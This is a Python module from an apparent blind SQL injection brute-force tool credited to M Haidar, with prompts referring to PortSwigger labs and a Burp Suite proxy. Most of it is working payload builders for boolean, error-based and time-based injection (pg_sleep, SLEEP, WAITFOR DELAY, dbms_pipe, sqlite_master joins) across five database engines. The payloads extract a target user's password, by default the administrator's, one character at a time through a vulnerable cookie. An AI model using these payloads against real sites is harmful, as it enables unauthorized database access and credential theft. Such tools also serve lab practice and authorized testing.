#!/usr/bin/env python3
import os
import sys
import string
import logging
from datetime import datetime
import requests
from urllib3.exceptions import InsecureRequestWarning
from colorama import init, Fore, Style, just_fix_windows_console

just_fix_windows_console()
init(autoreset=True)

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

LOG_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs")
os.makedirs(LOG_DIR, exist_ok=True)

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-GB,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

DBMS_CHOICES = ["auto", "mysql", "postgres", "oracle", "mssql", "sqlite"]


def setup_logger(log_file, name="BlindSQLiPro"):
    logger = logging.getLogger(name)
    logger.setLevel(logging.DEBUG)
    for h in list(logger.handlers):
        logger.removeHandler(h)
    fh = logging.FileHandler(log_file, mode='w', encoding='utf-8')
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(logging.INFO)
    ch.setFormatter(logging.Formatter('%(message)s'))
    logger.addHandler(fh)
    logger.addHandler(ch)
    return logger


def banner(title="B L I N D   S Q L I   B R U T E   T O O L", subtitle="", version="2.1"):
    print(f"""
{Fore.CYAN}
    ====================================================================
                {title}
                {subtitle}
    ====================================================================
    [+] Creator   : M Haidar
    [+] LinkedIn  : https://www.linkedin.com/in/haidarobs
    [+] GitHub    : https://github.com/mdhaidarobs
    [+] Version   : {version}
    ====================================================================
{Style.RESET_ALL}
    """)


def log_info(msg, color=Fore.GREEN):
    print(f"{color}[+]{Style.RESET_ALL} {msg}")


def log_warn(msg, color=Fore.YELLOW):
    print(f"{color}[!]{Style.RESET_ALL} {msg}")


def log_error(msg, color=Fore.RED):
    print(f"{color}[-]{Style.RESET_ALL} {msg}")


def build_charset(use_special=False):
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
    if use_special:
        charset += "!@#$%^&*()-_=+[]{}|;:,.<>?/\\~`"
    return charset


def make_session(retries=3):
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session


def make_proxies(proxy):
    if not proxy:
        return None
    return {'http': proxy, 'https': proxy}


def timestamp_log_name(prefix="sqli"):
    fname = f"{prefix}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    return os.path.join(LOG_DIR, fname)


def prompt_url():
    while True:
        url = input(f"{Fore.CYAN}Enter Target Lab URL (e.g., https://example.com/filter?category=Gifts): {Style.RESET_ALL}").strip()
        if url.startswith("http"):
            return url
        log_error("URL must start with http:// or https://. Try again.")


def prompt_tracking():
    while True:
        t = input(f"{Fore.CYAN}Enter your Base Tracking ID value: {Style.RESET_ALL}").strip()
        if t:
            return t
        log_error("Tracking ID cannot be empty. Try again.")


def prompt_cookie_name():
    c = input(f"{Fore.CYAN}Enter Cookie Name vulnerable to SQLi [Default: TrackingId]: {Style.RESET_ALL}").strip()
    return c if c else "TrackingId"


def prompt_session_cookie():
    s = input(f"{Fore.CYAN}Enter Session Cookie value (leave blank if none): {Style.RESET_ALL}").strip()
    return s if s else None


def prompt_users():
    u = input(f"{Fore.CYAN}Enter Username(s) to target (comma separated) [Default: administrator]: {Style.RESET_ALL}").strip()
    return u if u else "administrator"


def prompt_length():
    while True:
        v = input(f"{Fore.CYAN}Enter password length (REQUIRED, e.g., 20): {Style.RESET_ALL}").strip()
        if v:
            try:
                n = int(v)
                if n > 0:
                    return n
            except ValueError:
                pass
        log_error("Password length is required. Enter a positive integer.")


def prompt_proxy():
    use = input(f"{Fore.CYAN}Route traffic through Burp Suite proxy (127.0.0.1:8080)? (y/N): {Style.RESET_ALL}").strip().lower()
    if use == 'y':
        log_info("Proxy enabled: Traffic will route through Burp Suite.")
        return "http://127.0.0.1:8080"
    return None


def prompt_workers(default=1):
    w = input(f"{Fore.CYAN}Enter number of workers [Default: {default}, use 1 for PortSwigger]: {Style.RESET_ALL}").strip()
    if w:
        try:
            n = int(w)
            return max(1, n)
        except ValueError:
            pass
    return default


def prompt_special():
    s = input(f"{Fore.CYAN}Include special characters in charset? (y/N): {Style.RESET_ALL}").strip().lower()
    return s == 'y'


def prompt_timeout(default=15):
    t = input(f"{Fore.CYAN}Enter request timeout in seconds [Default: {default}]: {Style.RESET_ALL}").strip()
    if t:
        try:
            return max(1, int(t))
        except ValueError:
            pass
    return default


def prompt_dbms():
    print(f"{Fore.CYAN}Select target DBMS: {Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}[1]{Style.RESET_ALL} Auto-detect (recommended)")
    print(f"  {Fore.YELLOW}[2]{Style.RESET_ALL} MySQL")
    print(f"  {Fore.YELLOW}[3]{Style.RESET_ALL} PostgreSQL")
    print(f"  {Fore.YELLOW}[4]{Style.RESET_ALL} Oracle")
    print(f"  {Fore.YELLOW}[5]{Style.RESET_ALL} MSSQL")
    print(f"  {Fore.YELLOW}[6]{Style.RESET_ALL} SQLite")
    mapping = {"1": "auto", "2": "mysql", "3": "postgres", "4": "oracle", "5": "mssql", "6": "sqlite"}
    while True:
        v = input(f"{Fore.CYAN}Enter choice [Default: 1]: {Style.RESET_ALL}").strip() or "1"
        if v in mapping:
            return mapping[v]
        log_error("Invalid choice. Enter 1-6.")


def prompt_time_delay(default=10):
    v = input(f"{Fore.CYAN}Enter time delay in seconds for pg_sleep/SLEEP [Default: {default}]: {Style.RESET_ALL}").strip()
    if v:
        try:
            return max(1, int(v))
        except ValueError:
            pass
    return default


def prompt_time_threshold(default=7):
    v = input(f"{Fore.CYAN}Enter detection threshold in seconds (elapsed >= threshold = TRUE) [Default: {default}]: {Style.RESET_ALL}").strip()
    if v:
        try:
            return max(1, int(v))
        except ValueError:
            pass
    return default


def _substr(dbms, col, pos, length=1):
    if dbms == "mssql":
        return f"SUBSTRING({col},{pos},{length})"
    return f"SUBSTR({col},{pos},{length})"


def _length_fn(dbms, col):
    if dbms == "mssql":
        return f"LEN({col})"
    return f"LENGTH({col})"


def build_boolean_payload(dbms, base_id, user, position, char):
    sub = _substr(dbms, "password", position)
    return f"{base_id}' and (select {sub} from users where username='{user}')='{char}'--"


def build_boolean_probe(dbms, base_id, user):
    return f"{base_id}' and (select username from users where username='{user}')='{user}'--"


def build_error_payload(dbms, base_id, user, position, char):
    sub = _substr(dbms, "password", position)
    if dbms == "oracle":
        return (
            f"{base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END "
            f"from users where username='{user}' and {sub}='{char}') || '"
        )
    elif dbms == "mssql":
        return (
            f"{base_id}' || (select CASE WHEN ({sub}='{char}') THEN 1/0 ELSE '' END "
            f"from users where username='{user}') || '"
        )
    elif dbms == "mysql":
        return (
            f"{base_id}' and (select 1 from (select count(*),concat((select {sub} "
            f"from users where username='{user}'),floor(rand(0)*2))x from information_schema.tables group by x)a)--"
        )
    else:
        return f"{base_id}' and (select 1/0 from users where username='{user}' and {sub}='{char}')--"


def build_error_probe(dbms, base_id):
    if dbms == "oracle":
        return f"{base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '"
    elif dbms == "mssql":
        return f"{base_id}' || (select CASE WHEN (1=1) THEN 1/0 ELSE '' END) || '"
    elif dbms == "mysql":
        return f"{base_id}' and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--"
    else:
        return f"{base_id}' and 1/0--"


def build_time_payload(dbms, base_id, user, position, char, delay):
    sub = _substr(dbms, "password", position)
    if dbms == "postgres":
        return (
            f"{base_id}' || (select case when (username='{user}' and {sub}='{char}') "
            f"then pg_sleep({delay}) else pg_sleep(0) end from users)--"
        )
    elif dbms == "mysql":
        return (
            f"{base_id}' || (select case when (username='{user}' and {sub}='{char}') "
            f"then sleep({delay}) else sleep(0) end from users)--"
        )
    elif dbms == "oracle":
        return (
            f"{base_id}' || (select case when (username='{user}' and {sub}='{char}') "
            f"then dbms_pipe.receive_message(('a'),{delay}) else null end from users) || '"
        )
    elif dbms == "mssql":
        return (
            f"{base_id}'; if (select count(*) from users where username='{user}' and {sub}='{char}')>0 "
            f"waitfor delay '0:0:{delay}'--"
        )
    elif dbms == "sqlite":
        return (
            f"{base_id}' and (select case when (username='{user}' and {sub}='{char}') "
            f"then (select count(*) from sqlite_master a, sqlite_master b, sqlite_master c) else 0 end from users)--"
        )
    return ""


def build_time_probe(dbms, base_id, delay):
    if dbms == "postgres":
        return f"{base_id}' || pg_sleep({delay})--"
    elif dbms == "mysql":
        return f"{base_id}' || sleep({delay})--"
    elif dbms == "oracle":
        return f"{base_id}' || dbms_pipe.receive_message(('a'),{delay}) || '"
    elif dbms == "mssql":
        return f"{base_id}'; waitfor delay '0:0:{delay}'--"
    elif dbms == "sqlite":
        return f"{base_id}' and 1=(select count(*) from sqlite_master a, sqlite_master b, sqlite_master c)--"
    return ""


AUTO_DETECT_ORDER = ["postgres", "mysql", "oracle", "mssql", "sqlite"]